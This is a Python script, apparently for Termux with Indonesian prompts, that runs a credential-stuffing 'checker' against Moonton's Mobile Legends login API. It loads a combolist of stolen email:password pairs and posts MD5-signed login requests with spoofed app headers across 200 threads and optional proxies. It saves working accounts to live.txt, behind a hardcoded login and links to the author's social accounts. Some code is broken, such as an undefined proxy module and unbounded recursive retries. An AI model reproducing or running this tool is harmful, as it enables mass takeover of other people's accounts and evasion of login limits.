import os, sys
import time, random, getpass
import time;
print('''\033[92m
 [TINGGAL TIDUR AJA GPP] ''')
time.sleep(0.2)
print('\033[90m        []™ WALCOME TO PRIVAT TOOLS NUKIL ™[] [] ™TERMUX VERSION™ []\033[0m')
print('\033[90m        []========================================================[]\033[0m')
time.sleep(0.3)
print('\033[96m                              OPEN SOURCE\033[0m')
load = '[•]'
count = 0

for x in range(80):
    time.sleep(0.3)
    print(f'\r{load}', end='', flush=True)
    count += 1
    if count == 3:
        count = 0
        load += '[•]'
os.system('clear')
import os, sys, random, time, getpass
from time import sleep
username = 'Danu'
password = 'sc-d'

def masuk():
               os.system('clear')
               print('[+] LOGIN CHK PROXY METHOD BY SC-D [+]')
               print('')
               uname = input('    username : ')
               if uname == username:
                              pw = getpass.getpass('    password : ')
                              if pw == password:
                                          print('')
                              else:
                                          print(' password salah ler ! ')
                                          os.system('xdg-open https://www.facebook.com/shinchanXD404')
                                          exit()
               else:
                            print(' username salah ler ! ')
                            os.system('xdg-open https://www.facebook.com/shinchanXD404')
                            exit()
masuk()
os.system('xdg-open https://wa.me/6283893242384')
from datetime import datetime

saat_ini = datetime.now()
jam = saat_ini.strftime('%H:%M:%S')
print('        [+]===================[+]')
print('\033[92m           Jam:\033[0m', jam)
tgl = saat_ini.strftime('%d/%m/%Y') # format dd/mm/YY
print('\033[92m           Tanggal:\033[0m', tgl)
print('        [+]===================[+]')
print('[+]=================================[+]')
print('\033[92m      CHECKER MOONTON PROXY METHOD')
print('      SUPORT CLI MATE & FAST TIME\033[0m')
print('[+]=================================[+]')

# coding=utf-8
#
import os, sys, hashlib, json, random, re
os.system('clear')

try:
  from concurrent.futures import ThreadPoolExecutor
except ImportError:
  os.system(
    'pip install futures'
  )
  exit(
    'Please restart this tools'
  )

try:
  from bs4 import BeautifulSoup as bs
except ImportError:
  os.system(
    'pip install bs4'
  )
  exit(
    'Please restart this tools'
  )
  
try:
  import requests
except ImportError:
  os.system(
    'pip install requests'
  )
  exit(
    'Please restart this tools'
  )

api = 'https://accountmtapi.mobilelegends.com/'

class MOONTON:
  def __init__(self, url):
    self.userdata = []
    self.live = []
    self.wrong_password = []
    self.wrong_email = []
    self.limit_login = []
    self.unknown = []
    self.proxy_list = []
    self.api = url
    self.loop = 0
    print('')
  def auto_upper(self, string):
    text = ''.join(
      re.findall(
        '[a-z-A-Z]',
        string
      )
    )
    if text.islower(
      ) == True:
      o = ''
      for i in range(
        len(
          string
        )
      ):
        if string[i].isnumeric(
          ) == False and string[
            i
          ].isalpha(
          ):
          return o + string[
            i
          ].upper(
          ) + string[
            i+1:
          ]
        else: o+=string[
          i
        ]
      return string 
    else: return string

  def main(self):
    empas = input(
      '\033[96m[•] COMBOLIST =>\033[0m '
    )
    if os.path.exists(
      empas
    ):
      for data in open(
        empas,
        'r',
        encoding='utf-8'
      ).readlines():
        try:
          user = data.strip(
          ).split(
            '|'
          )
          if user[
           0
          ] and user[
            1
          ]:
            em = user[
              0
            ]
            pw = self.auto_upper(
              user[
                1
              ]
            )
            self.userdata.append({
              'email': em,
              'pw': pw,
              'userdata': '|'.join(
                [
                  em,
                  pw
                ]
              )
            })
        except IndexError:
          try:
            user = data.strip().split(
              ':'
            )
            if user[
              0
            ] and user[
              1
            ]:
              em = user[
                0
              ]
              pw = self.auto_upper(
                user[
                  1
                ]
              )
              self.userdata.append({
                'email': em,
                'pw': pw,
                'userdata': ':'.join(
                  [
                    em,
                    pw
                  ]
                )
             })
          except: pass
      if len(
        self.userdata
      ) == 0:
        exit(
          '[!] Empas tidak ada atau tidak valid pastikan berformat email:pass atau email|pass'
        )
      print('')
      print(
        '\033[96m[] => TOTAL {0} ACCOUNT <= []'.format(
          str(
            len(
              self.userdata
            )
          )
        )
      )
      print('')
      ask = input(
        '\033[93m[*] WITH PROXY\033[0m=> '
      )
      if ask.lower(
      ).strip(
      ) == 'sock5':
        self.valid_proxy = proxy.prox(
        )
        with ThreadPoolExecutor(
          max_workers=200
        ) as thread:
          [
            thread.submit(
              self.validate,
              user,
              True
            ) for user in self.userdata
          ]
      else:
        print(
          ''
        )
        with ThreadPoolExecutor(
          max_workers=200
        ) as thread:
          [
            thread.submit(
              self.validate,
              user,
              False
            ) for user in self.userdata
          ]
      print(
        '\n\n[#] LIVE: '+str(
          len(
            self.live
          )
        )+' - saved: live.txt'
      )
      if len(
        self.live
      ) != 0:
        print(
          '\n'.join(
            self.live
          )+'\n'
        )
      print(
        '[#] WRONG PASS: '+str(
          len(
            self.wrong_password
          )
        )+' - saved: wrongPwd.txt'
      )
      print(
        '[#] WRONG EMAIL: '+str(
          len(
            self.wrong_email
          )
        )+' - saved: wrongEmail.txt'
      )
      print(
        '[#] LIMIT LOGIN: '+str(
          len(
            self.limit_login
          )
        )+' - saved: limitLogin.txt'
      )
      print(
        '[#] UNKNOWN: '+str(
          len(
            self.unknown
          )
        )+' - saved: unknown.txt'
      )
      exit(
      )
    else: print(
      '[!] File tidak ditemukan "{0}"'.format(
        empas
      )
    )

  def hash_md5(self, string):
    md5 = hashlib.new(
      'md5'
    )
    md5.update(
      string.encode(
        'utf-8'
      )
    )
    return md5.hexdigest(
    )

  def build_params(self, user):
    md5pwd = self.hash_md5(
      user[
        'pw'
      ]
    )
    hashed = self.hash_md5(
      'account={0}&md5pwd={1}&op=login'.format(
        user[
          'email'
        ],
        md5pwd
      )
    )
    return json.dumps({
      'op': 'login',
      'sign': hashed,
      'params': {
        'account': user[
          'email'
        ],
        'md5pwd': md5pwd,
      },
      'lang': 'cn'
    })
  
  def validate(self, user, with_porxy):
    try:
      data = self.build_params(
        user
      )
      headers = {
        'host': 'accountmtapi.mobilelegends.com',
        'origin': 'mtacc.mobilelegends.com',
        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1716 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.110 Mobile Safari/537.36',
        'x-requested-with': 'com.mobile.legends' # Fake requests
      }
      if with_porxy == True:
        proxy = random.choice(
          self.valid_proxy
        )
        response = requests.post(
          self.api,
          data=data,
          headers=headers,
          proxies=proxy,
          timeout=7
        )
      else:
        response = requests.post(
          self.api,
          data=data,
          headers=headers
        )
      if response.status_code == 200:
        if response.json(
        )[
          'message'
         ] == 'Error_Success':
          print(
            '\r|SCH-T| =>[\033[92mGOOD\033[0m] '+user[
              'userdata'
             ]+' => |\033[92mSUCCES \033[0m|'
          )
          self.live.append(
            user[
              'userdata'
            ]
          )
          open(
            'live.txt',
            'a'
          ).write(
            str(
              user[
                'userdata'
              ]
            )+'\n'
          )
        elif response.json(
        )[
          'message'
         ] == 'Error_PasswdError':
          print(
            '\r|SCH-T| => [\033[91mDIEE\033[0m] '+user[
              'userdata'
            ]+' => |\033[94mPW-FALSE\033[0m|'
          )
          self.wrong_password.append(
            user[
              'userdata'
            ]
          )
          open(
            'wrongPwd.txt',
            'a'
          ).write(
            str(
              user[
                'userdata'
              ]
            )+'\n'
          )
        elif response.json(
        )[
          'message'
         ] == 'Error_PwdErrorTooMany':
          print(
            '\r|SCH-T| => [\033[91mDIEE\033[0m] '+user[
              'userdata'
            ]+' => |\033[94mLIMIT\033[0m|'
          )
          self.limit_login.append(
            user[
              'userdata'
            ]
          )
          open(
            'limitLogin.txt',
            'a'
          ).write(
            str(
              user[
                'userdata'
              ]
            )+'\n'
          )
        elif response.json(
        )[
          'message'
        ] == 'Error_NoAccount':
          print(
            '\r|SCH-T| => [\033[91mDIEE\033[0m] '+user[
              'userdata'
            ]+' => |\033[94mEMAIL FALSE\033[0m|'
          )
          self.wrong_email.append(
            user[
              'userdata'
            ]
          )
          open(
            'wrongEmail.txt',
            'a'
          ).write(
            str(
              user[
                'userdata'
              ]
            )+'\n'
          )
        else:
          print(
            '\r|SCH-T| => [\033[91mDIEE\033[0m] '+user[
              'userdata'
            ]+' => |\033[94mNOT FOUND\033[0m|'
          )
          self.unknown.append(
            user[
              'userdata'
            ]
          )
          open(
            'unknown.txt',
            'a'
          ).write(
            str(
              user[
                'userdata'
              ]
            )+'\n'
          )
        die = len(
          self.wrong_password
        ) + len(
          self.limit_login
        ) + len(
          self.wrong_email
        ) + len(
          self.unknown
        )
        self.loop+=1
        print(
          end='\r[SCH-T]<>[HITS] Checked: %s <=> %s \033[92mGOOD  %s  \033[91mDIEE  %s \033[0m'%(
            str(
              self.loop
            ),
            str(
              len(
                self.userdata
              )
            ),
            str(
              len(
                self.live
              )
            ),
            str(
              die
            )
          ),
          flush=True
        )
      else: self.validate(
        user,
        with_porxy
      )
    except: self.validate(
      user,
      with_porxy
    )

if __name__ == '__main__':
  try:
    (
      MOONTON(
        api
      ).main(
      )
    )
  except Exception as E:
    exit(
      '[!] Error: %s' %(
        E
      )
    )